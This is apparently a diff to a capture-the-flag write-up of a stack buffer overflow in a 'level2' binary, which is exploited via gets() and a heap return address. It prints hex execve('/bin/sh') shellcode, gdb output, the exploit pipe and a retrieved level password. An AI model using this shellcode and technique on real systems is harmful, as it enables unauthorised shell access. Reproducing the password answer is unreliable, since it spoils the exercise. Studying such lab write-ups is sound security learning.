@@ -89,6 +89,8 @@ So the protection does not block it.
 
 so we need to put the shellcode of execve("/bin/sh", NULL, NULL) which is :\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80 (check explanation in syscallABI.txt)
 
+the shellcode is 21 bytes 
+
 We need execution flow like this:
 --------------------------------
 
@@ -106,6 +108,17 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Program received signal SIGSEGV, Segmentation fault.
 0x61616161 in ?? ()
 (gdb) 
+
+
+In x86 programs, EAX is used for: Return values from functions
+
+When a function returns, the result is stored in EAX.
+
+
+
+so :
+
+
 
 (gdb) info registers eax
 eax            0x804a008	134520840
@@ -133,3 +146,51 @@ pwd
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
+
+
+( python ... ; cat ) | ./level2
+
+generate payload
++
+keep stdin open
+↓
+send everything to ./level2
+
+
+Python prints exploit payload
+↓
+payload sent through pipe to ./level2
+↓
+program enters function p()
+↓
+fflush() clears output buffer
+↓
+gets() reads input into stack buffer
+↓
+gets() copies payload without size check
+↓
+buffer overflow occurs
+↓
+saved EBP overwritten
+↓
+return address overwritten with 0x0804a008
+↓
+program performs security check on return address
+↓
+check passes because 0x0804a008 is not a stack address
+↓
+puts() prints the user input
+↓
+strdup() copies the input to heap memory
+↓
+function p() finishes
+↓
+ret instruction executes
+↓
+EIP loaded with 0x0804a008
+↓
+CPU jumps to shellcode stored in buffer
+↓
+shellcode executes execve("/bin/sh")
+↓
+interactive shell appears
